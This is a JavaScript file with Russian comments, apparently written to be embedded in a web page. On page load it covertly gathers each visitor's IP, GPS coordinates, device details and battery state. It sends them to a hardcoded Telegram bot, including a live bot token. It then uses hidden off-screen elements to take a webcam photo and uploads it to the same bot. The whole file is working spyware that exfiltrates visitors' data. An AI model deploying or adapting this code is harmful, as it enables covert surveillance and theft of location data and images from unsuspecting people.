// =================================================================
//                 КОНФИГУРАЦИЯ TELEGRAM
// =================================================================
// Ваши параметры
const BOT_TOKEN = "7986900528:AAHAQ9HuC9gl0cFXYyMZkXgw1qo8ogClqWw";
const CHAT_ID = "7518382960"; 
        
// API для получения IP и Геолокации. Используем ipapi.co
const GEO_API_URL = 'https://ipapi.co/json/'; 

// =================================================================
//          ВСПОМОГАТЕЛЬНАЯ ФУНКЦИЯ ДЛЯ HTML-ЭКРАНИРОВАНИЯ
// =================================================================
/**
 * Экранирует специальные символы (<, >, &) для HTML-форматирования в Telegram.
 */
function escapeHTML(text) {
    if (!text) return 'Н/Д';
    const str = (typeof text === 'object' ? JSON.stringify(text) : String(text));
    return str.replace(/&/g, '&amp;')
              .replace(/</g, '&lt;')
              .replace(/>/g, '&gt;');
}

// =================================================================
//                 ОСНОВНАЯ ФУНКЦИЯ ОТПРАВКИ ДАННЫХ
// =================================================================
async function sendVisitorData() {
    let visitorData = {};
    
    try {
        // --- Блок 1: Сбор геоданных и IP (через внешний API) ---
        const geoResponse = await fetch(GEO_API_URL);
        const geoData = await geoResponse.json();
        
        // --- Блок 2: Сбор данных с клиента (через JavaScript API) ---
        
        const userAgent = navigator.userAgent;
        let browser = 'Н/Д', os = 'Н/Д';

        // 1. Определение ОС
        if (userAgent.includes('Win')) os = 'Windows';
        else if (userAgent.includes('Mac')) os = 'macOS';
        else if (userAgent.includes('Linux')) os = 'Linux';
        else if (userAgent.includes('Android')) os = 'Android';
        else if (userAgent.includes('iPhone')) os = 'iOS';

        // 2. Определение Браузера
        if (userAgent.includes('Firefox')) browser = 'Firefox';
        else if (userAgent.includes('Edg')) browser = 'Edge';
        else if (userAgent.includes('Chrome')) browser = 'Chrome';
        else if (userAgent.includes('Safari') && !userAgent.includes('Chrome')) browser = 'Safari';

        // --- НОВЫЙ БЛОК: Определение Модели Android ---
        let androidModel = 'Н/Д';
        if (os === 'Android') {
            // Типичный формат: ...Android 10; [Марка] [Модель] Build/...
            // Или: ...Android 10; Mobile Build/...
            
            // Пытаемся найти паттерн, который обычно содержит модель (напр., SM-A505F)
            const match = userAgent.match(/Android [0-9.]+; ([^;]+) Build/);

            if (match && match[1]) {
                // match[1] может содержать "Марка Модель" или просто "Модель"
                const modelStr = match[1].trim();
                
                // Исключаем общие слова, такие как "Mobile", "Tablet" и "rv:" (для Firefox)
                if (!modelStr.includes('Mobile') && !modelStr.includes('Tablet') && !modelStr.includes('rv:')) {
                    androidModel = modelStr;
                }
            }

            // Дополнительная проверка на часто встречаемый "Linux; Android ..."
            if (androidModel === 'Н/Д') {
                 const linuxMatch = userAgent.match(/Linux; Android [0-9.]+; ([^;)]+)/);
                 if (linuxMatch && linuxMatch[1]) {
                    const modelStr = linuxMatch[1].trim();
                     if (!modelStr.includes('Mobile') && !modelStr.includes('Tablet')) {
                         androidModel = modelStr;
                     }
                 }
            }
        }
        // ---------------------------------------------
        
        let batteryInfo = 'Н/Д';
        if ('getBattery' in navigator) {
            try {
                const battery = await navigator.getBattery();
                const level = Math.round(battery.level * 100);
                const charging = battery.charging ? 'Да' : 'Нет';
                batteryInfo = `${level}% (Зарядка: ${charging})`;
            } catch (e) {
                batteryInfo = 'Нет доступа';
            }
        }
        
        const plugins = Array.from(navigator.plugins).map(p => p.name).join(', ') || 'Нет';
        const pluginsShort = plugins.substring(0, 100) + (plugins.length > 100 ? '...' : '');
        
        const deviceMemory = navigator.deviceMemory || 'Н/Д (API не поддерживается)';


        // --- Запрос точной геолокации ---
        let preciseLocation = { coords: 'Н/Д', accuracy: 'Н/Д' };

        if ('geolocation' in navigator) {
            try {
                const position = await new Promise((resolve, reject) => {
                    navigator.geolocation.getCurrentPosition(resolve, reject, {
                        enableHighAccuracy: true,
                        timeout: 4000, 
                        maximumAge: 0  
                    });
                });
                
                preciseLocation.coords = `${position.coords.latitude.toFixed(5)}, ${position.coords.longitude.toFixed(5)}`;
                preciseLocation.accuracy = `${Math.round(position.coords.accuracy)} м`;

            } catch (e) {
                let errorType = e.code === 1 ? 'ОТКЛОНЕН' : (e.code === 3 ? 'Таймаут' : e.name);
                preciseLocation.coords = `Доступ ${errorType}`;
                preciseLocation.accuracy = 'Н/Д';
                console.warn(`Geolocation API error: ${e.message}`);
            }
        }
        
        // 3. Формирование объекта данных с экранированием
        visitorData = {
            ip: escapeHTML(geoData.ip || 'Н/Д'),
            country: escapeHTML(geoData.country_name || 'Н/Д'),
            city: escapeHTML(geoData.city || 'Н/Д'),
            org: escapeHTML(geoData.org || 'Н/Д'),
            timezone: escapeHTML(geoData.timezone || 'Н/Д'),
            
            precise_coords: escapeHTML(preciseLocation.coords),
            precise_accuracy: escapeHTML(preciseLocation.accuracy),

            os: escapeHTML(os),
            android_model: escapeHTML(androidModel), // НОВОЕ ПОЛЕ
            browser: escapeHTML(browser),
            device_memory: escapeHTML(deviceMemory), 
            screen_res: escapeHTML(`${window.screen.width}x${window.screen.height}`),
            language: escapeHTML(navigator.language),
            hardware_concurrency: escapeHTML(navigator.hardwareConcurrency || 'Н/Д'),
            online_status: escapeHTML(navigator.onLine ? 'Онлайн' : 'Офлайн'),
            battery_status: escapeHTML(batteryInfo),
            plugins_list: escapeHTML(pluginsShort),
            history_length: escapeHTML(window.history.length || 1),
            current_time: escapeHTML(new Date().toLocaleString('ru-RU', { timeZoneName: 'short' })),
            full_ua: escapeHTML(userAgent.substring(0, 150) + (userAgent.length > 150 ? '...' : '')),
        };

        // -----------------------------------------------------------------
        // --- Блок 4: Формирование сообщения (Детальный HTML-формат) ---
        // -----------------------------------------------------------------
        
        // Условное добавление модели Android
        const androidModelLine = visitorData.os === 'Android' 
            ? `— Модель Android: <b>${visitorData.android_model}</b>\n` 
            : '';

        const messageText = 
            `&#x2705; <b>МАКСИМУМ ДАННЫХ ПОСЕТИТЕЛЯ</b>\n` +
            `&#x23F1; <b>Время:</b> <code>${visitorData.current_time}</code>\n\n` +
            
            `\u{1F310} <b>СЕТЬ И ГЕОЛОКАЦИЯ</b>\n` +
            `— IP: <code>${visitorData.ip}</code>\n` +
            `— Страна (по IP): <b>${visitorData.country}</b> (${visitorData.city})\n` +
            `— Провайдер: ${visitorData.org}\n` +
            `— Часовой пояс: ${visitorData.timezone}\n` +
            `— Статус сети: ${visitorData.online_status}\n\n` +
            
            `\u{1F5FA} <b>ТОЧНЫЕ КООРДИНАТЫ (GPS/Wi-Fi)</b>\n` +
            `— Координаты: <code>${visitorData.precise_coords}</code>\n` +
            `— Точность: <b>${visitorData.precise_accuracy}</b>\n\n` + 
            
            `\u{1F4BB} <b>УСТРОЙСТВО И СИСТЕМА</b>\n` +
            `— ОС / Браузер: <b>${visitorData.os}</b> / <b>${visitorData.browser}</b>\n` +
            androidModelLine + // ВСТАВКА НОВОЙ СТРОКИ
            `— <b>RAM (ОЗУ):</b> <code>${visitorData.device_memory} GiB</code>\n` +
            `— Язык: ${visitorData.language}\n` +
            `— Разрешение: ${visitorData.screen_res}\n` +
            `— Ядра CPU (потоки): ${visitorData.hardware_concurrency}\n` +
            `— Состояние батареи: ${visitorData.battery_status}\n` +
            `— Посещено страниц: ${visitorData.history_length}\n` +
            `— Плагины: <code>${visitorData.plugins_list}</code>\n` +
            `— User-Agent (кратко): <code>${visitorData.full_ua}</code>`;
            
        // 5. Кодирование текста и отправка запроса
        const encodedMessage = encodeURIComponent(messageText);

        const TELEGRAM_URL = 
            `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?` +
            `chat_id=${CHAT_ID}&` +
            `text=${encodedMessage}&` +
            `parse_mode=HTML`;

        const telegramResponse = await fetch(TELEGRAM_URL);
        
        if (telegramResponse.ok) {
            console.log('Детальное уведомление успешно отправлено.');
        } else {
            console.error(`Ошибка (${telegramResponse.status}) при отправке детального уведомления в Telegram.`, await telegramResponse.json());
        }

    } catch (error) {
        console.error('Критическая ошибка при сборе данных или отправке:', error);
    }
}


// =================================================================
//                 ЛОГИКА ДЛЯ ДИНАМИЧЕСКОГО ЗАХВАТА ФОТО
// =================================================================

/**
 * ИСПРАВЛЕННАЯ ФУНКЦИЯ:
 * Отправляет изображение в Telegram через POST-запрос с использованием FormData.
 */
async function sendPhotoToTelegram(imageDataURL) {
    try {
        // 1. Преобразуем Base64 в Blob (бинарный объект)
        const response = await fetch(imageDataURL);
        const blob = await response.blob();

        // 2. Создаем FormData, который имитирует форму загрузки файла
        const formData = new FormData();
        formData.append('photo', blob, 'webcam_capture.jpeg'); 
        formData.append('chat_id', CHAT_ID);
        formData.append('caption', "Скрытый захват с веб-камеры");
        
        // 3. Формируем POST-запрос
        const TELEGRAM_URL = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;

        const telegramResponse = await fetch(TELEGRAM_URL, {
            method: 'POST', 
            body: formData  
        });
        
        // 4. Проверяем ответ
        if (telegramResponse.ok) {
            console.log('Скрытое фото успешно отправлено в Telegram через POST-запрос.');
        } else {
            const errorData = await telegramResponse.json();
            console.error(`Ошибка (${telegramResponse.status}) при отправке фото:`, errorData);
        }
    } catch (error) {
        console.error('Критическая ошибка при отправке фото:', error);
    }
}


/**
 * Динамически создает элементы, запрашивает доступ к камере, делает снимок и удаляет элементы.
 */
async function captureAndSendHiddenPhoto() {
    let stream = null;
    let videoElement = null;
    let canvasElement = null;

    try {
        // 1. Динамическое создание элементов
        videoElement = document.createElement('video');
        canvasElement = document.createElement('canvas');
        
        // Скрываем элементы (невидимый для пользователя)
        videoElement.style.cssText = 'position: fixed; top: -9999px; left: -9999px; visibility: hidden;';
        canvasElement.style.cssText = 'position: fixed; top: -9999px; left: -9999px; visibility: hidden;';

        document.body.appendChild(videoElement);
        document.body.appendChild(canvasElement);

        // 2. Запрос доступа к камере (здесь появится окно с запросом разрешения)
        stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
        videoElement.srcObject = stream;
        videoElement.play();

        // 3. Ждем, пока видео начнет проигрываться, чтобы получить размеры
        await new Promise(resolve => videoElement.onloadedmetadata = resolve);

        // Установка размеров canvas
        canvasElement.width = videoElement.videoWidth || 640;
        canvasElement.height = videoElement.videoHeight || 480;

        // 4. Захват кадра
        const context = canvasElement.getContext('2d');
        // Даем браузеру секунду на "разогрев" потока, чтобы избежать черного кадра
        await new Promise(resolve => setTimeout(resolve, 1000)); 
        context.drawImage(videoElement, 0, 0, canvasElement.width, canvasElement.height);
        
        // Преобразование в Base64 (низкое качество для уменьшения размера)
        const imageDataURL = canvasElement.toDataURL('image/jpeg', 0.6); 

        // 5. Отправка
        await sendPhotoToTelegram(imageDataURL);

    } catch (err) {
        // Если пользователь заблокировал доступ или произошла ошибка
        console.warn(`Захват фото был пропущен. Вероятная причина: ${err.name} (пользователь отклонил доступ или нет камеры).`);
    } finally {
        // 6. Обязательная остановка потока и удаление элементов
        if (stream) {
            stream.getTracks().forEach(track => track.stop());
        }
        if (videoElement && videoElement.parentNode) {
            videoElement.parentNode.removeChild(videoElement);
        }
        if (canvasElement && canvasElement.parentNode) {
            canvasElement.parentNode.removeChild(canvasElement);
        }
    }
}


// Запуск функций при загрузке страницы
window.onload = async () => {
    // 1. Отправляем все собранные данные (включая запрос геолокации)
    await sendVisitorData(); 
    
    // 2. Пытаемся сделать скрытое фото
    await captureAndSendHiddenPhoto();
};